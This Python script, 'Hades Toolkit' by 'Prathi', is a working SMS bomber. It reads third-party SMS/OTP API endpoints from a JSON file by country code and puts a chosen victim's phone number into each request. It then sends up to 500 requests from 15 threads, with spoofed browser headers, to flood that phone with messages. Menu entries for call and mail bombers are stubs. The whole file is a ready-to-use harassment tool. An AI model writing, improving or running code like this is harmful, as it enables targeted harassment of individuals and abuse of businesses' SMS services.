#!/usr/bin/env python
import os
import sys
import time
import platform
import subprocess
import random
import requests
import json
import concurrent.futures

# Add project root to Python path for module imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

try:
    from utils.ui import console
    from rich.panel import Panel
    from rich.prompt import Prompt
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
except ImportError:
    print("Error: 'rich' library not found. Please install it using: pip install rich")
    sys.exit(1)

# --- Configuration ---
API_FILE = os.path.join(os.path.dirname(__file__), 'api.json')

def load_apis(country_code):
    """Loads SMS APIs from the JSON file for a specific country code."""
    try:
        with open(API_FILE, 'r') as f:
            all_apis = json.load(f)
        
        sms_apis = all_apis.get("sms", {})
        country_specific_apis = sms_apis.get(str(country_code), [])
        multi_country_apis = sms_apis.get("multi", [])
        
        combined_apis = country_specific_apis + multi_country_apis
        
        if not combined_apis:
            console.print(f"[bold red]Warning: No APIs found for country code {country_code} or in the 'multi' list.[/bold red]")
            return []
            
        return combined_apis
    except FileNotFoundError:
        console.print(f"[bold red]Error: API file not found at '{API_FILE}'[/bold red]")
        return None
    except json.JSONDecodeError:
        console.print(f"[bold red]Error: Could not decode the API file. Please check if '{API_FILE}' is a valid JSON.[/bold red]")
        return None
    except Exception as e:
        console.print(f"[bold red]An unexpected error occurred while loading APIs: {e}[/bold red]")
        return None

def clear_screen():
    """Clears the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    """Displays the banner."""
    clear_screen()
    console.print(Panel("""
[bold red]
██   ██ █████  ██████  ███████ ███████ 
██   ██ ██   ██ ██   ██ ██      ██      
███████ ███████ ██████  █████   █████   
██   ██ ██   ██ ██   ██ ██      ██      
██   ██ ██   ██ ██████  ███████ ███████ 
[/bold red]
[bold blue]T O O L K I T[/bold blue]
    """, title="[bold green]Hades Toolkit[/bold green]", subtitle="[cyan]SMS Bomber[/cyan]"))
    console.print("[bold green]Author:[/bold green] Prathi", justify="center")
    console.print("[bold green]Version:[/bold green] 1.0", justify="center")
    console.print("\n")

def send_request(api_details, phone_number, country_code):
    """Sends a single SMS request based on the provided API configuration."""
    try:
        # Deep copy to avoid modifying the original list
        api = json.loads(json.dumps(api_details))
        url = api["url"]
        method = api.get("method", "GET").upper()
        domain = url.split('/')[2]

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Origin': f"https://{domain}",
            'Referer': f"https://{domain}/"
        }
        # Add custom headers from api.json
        if "headers" in api:
            headers.update(api["headers"])

        # Replace placeholders
        str_api = json.dumps(api)
        str_api = str_api.replace("{target}", phone_number).replace("{cc}", country_code)
        api = json.loads(str_api)

        payload_type = None
        if "data" in api: payload_type = "data"
        elif "json" in api: payload_type = "json"
        
        # Handle cookies
        cookies = api.get("cookies")

        if method == "POST":
            if payload_type == "json":
                response = requests.post(url, json=api["json"], headers=headers, cookies=cookies, timeout=10)
            elif payload_type == "data":
                response = requests.post(url, data=api["data"], headers=headers, cookies=cookies, timeout=10)
            else: # Default to json if no specific payload type is found
                response = requests.post(url, headers=headers, cookies=cookies, timeout=10)

        else: # GET request
            response = requests.get(url, params=api.get("params"), headers=headers, cookies=cookies, timeout=10)

        # Check for success based on status code and identifier
        identifier = api.get("identifier", "").lower()
        response_text = response.text.lower()
        
        if response.status_code < 300 and (not identifier or identifier in response_text):
            return True, domain, f"Success ({response.status_code})"
        else:
            try:
                error_msg = response.json().get('message', f"Failed ({response.status_code})")
            except json.JSONDecodeError:
                error_msg = f"Failed ({response.status_code})"
            return False, domain, error_msg

    except requests.exceptions.RequestException as e:
        return False, "Network", f"Request Error: {e.__class__.__name__}"
    except Exception as e:
        return False, "Local", f"Config/Execution Error: {e}"

def run_attack(phone_number, country_code, message_count, delay, api_list):
    """Manages the SMS bombing attack."""
    console.print(f"\n[bold red]🚀 Starting Attack on +{country_code}{phone_number}[/bold red]")
    console.print(f"[cyan]📨 Messages to send: {message_count}[/cyan]")
    console.print(f"[cyan]⏱️  Delay between messages: {delay}s[/cyan]\n")

    successful_sends = 0
    failed_sends = 0

    apis_for_attack = (api_list * (message_count // len(api_list) + 1))[:message_count]
    random.shuffle(apis_for_attack)

    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}"), BarColumn(), TextColumn("{task.percentage:>3.0f}%"), transient=False) as progress:
        task = progress.add_task("Sending...", total=message_count)

        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
            future_to_api = {executor.submit(send_request, api, phone_number, country_code): api for api in apis_for_attack}

            for i, future in enumerate(concurrent.futures.as_completed(future_to_api)):
                try:
                    success, domain, message = future.result()
                    if success:
                        successful_sends += 1
                        console.print(f"[green]🚀 {domain}: {message}[/green]")
                    else:
                        failed_sends += 1
                        console.print(f"[red]💥 {domain}: {message}[/red]")
                except Exception as e:
                    failed_sends += 1
                    console.print(f"[bold red]CRITICAL ERROR: Thread execution failed: {e}[/bold red]")

                progress.update(task, advance=1)
                if i < message_count - 1 and delay > 0:
                    time.sleep(delay)

    console.print(f"\n[bold green]📊 Attack Finished![/bold green]")
    console.print(f"[green]✅ Successful: {successful_sends}[/green]")
    console.print(f"[red]❌ Failed: {failed_sends}[/red]")
    if message_count > 0:
        success_rate = (successful_sends / message_count) * 100
        console.print(f"[cyan]📈 Success Rate: {success_rate:.1f}%[/cyan]")

def start_sms_bomber():
    """Starts the SMS bombing process."""
    banner()
    
    try:
        country_code = Prompt.ask("[yellow]Enter target country code (e.g., 91 for India)[/yellow]")
        if not country_code.isdigit():
            console.print("[bold red]Invalid country code. Please enter digits only.[/bold red]")
            return

        loaded_apis = load_apis(country_code)
        if not loaded_apis:
            console.print("[bold red]Could not proceed without APIs. Exiting.[/bold red]")
            return
            
        console.print(f"[green]✅ Loaded {len(loaded_apis)} SMS APIs for country code {country_code}.[/green]\n")
        random.shuffle(loaded_apis)

        phone_number = Prompt.ask(f"[yellow]Enter target mobile number (without +{country_code})[/yellow]")
        if not (phone_number.isdigit() and len(phone_number) > 5): # Basic validation
            console.print("[bold red]Invalid input. Please enter a valid mobile number.[/bold red]")
            return
        
        count_str = Prompt.ask("[yellow]How many messages? (1-500)[/yellow]", default="50")
        message_count = int(count_str)
        if not 1 <= message_count <= 500:
            console.print("[bold red]Count must be between 1 and 500.[/bold red]")
            return

        delay_str = Prompt.ask("[yellow]Delay between messages (seconds)[/yellow]", default="0.05")
        delay = float(delay_str)
        if delay < 0:
            console.print("[bold red]Delay cannot be negative.[/bold red]")
            return

        confirm = Prompt.ask(f"[bold cyan]Send {message_count} messages to +{country_code}{phone_number}?", choices=["y", "n"], default="y")
        if confirm == "n":
            console.print("[yellow]Attack cancelled.[/yellow]")
            return
        
        run_attack(phone_number, country_code, message_count, delay, loaded_apis)

    except (ValueError, TypeError):
        console.print("[bold red]Invalid input. Please enter a valid number.[/bold red]")
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Program interrupted by user.[/bold yellow]")

def update_tool():
    """Updates the tool by pulling the latest changes from the git repository."""
    banner()
    console.print("[bold yellow]Updating Hades Toolkit...[/bold yellow]")
    try:
        process = subprocess.run(["git", "pull"], capture_output=True, text=True, check=True)
        console.print("[bold green]Update successful![/bold green]")
        console.print(process.stdout)
    except subprocess.CalledProcessError as e:
        console.print("[bold red]Update failed![/bold red]")
        console.print(e.stderr)
    except FileNotFoundError:
        console.print("[bold red]Git is not installed or not in your PATH.[/bold red]")

def main():
    """Main function to display the menu and handle user input."""
    while True:
        banner()
        console.print("[bold cyan]Please Read Instructions Carefully !!![/bold cyan]\n")
        console.print("[bold]1[/bold] To Start [bold green]SMS[/bold green] Bomber")
        console.print("[bold]2[/bold] To Start [bold yellow]CALL[/bold yellow] Bomber ([red]Not Yet Available[/red])")
        console.print("[bold]3[/bold] To Start [bold blue]MAIL[/bold blue] Bomber ([red]Not Yet Available[/red])")
        console.print("[bold]4[/bold] To [bold magenta]Update[/bold magenta] Hades Toolkit")
        console.print("[bold]5[/bold] To [bold red]Exit[/bold red]")
        
        choice = Prompt.ask("\n[bold]Enter your choice[/bold]", choices=["1", "2", "3", "4", "5"], default="5")

        if choice == '1':
            start_sms_bomber()
            Prompt.ask("\n[cyan]Press Enter to return to the main menu...[/cyan]")
        elif choice == '2':
            console.print("\n[bold yellow]CALL Bomber is not yet available. Please check back later.[/bold yellow]")
            time.sleep(2)
        elif choice == '3':
            console.print("\n[bold blue]MAIL Bomber is not yet available. Please check back later.[/bold blue]")
            time.sleep(2)
        elif choice == '4':
            update_tool()
            Prompt.ask("\n[cyan]Press Enter to return to the main menu...[/cyan]")
        elif choice == '5':
            banner()
            console.print("[bold red]Exiting...[/bold red]")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear_screen()
        console.print("\n[bold yellow]Program interrupted by user. Exiting.[/bold yellow]")
        sys.exit(0)
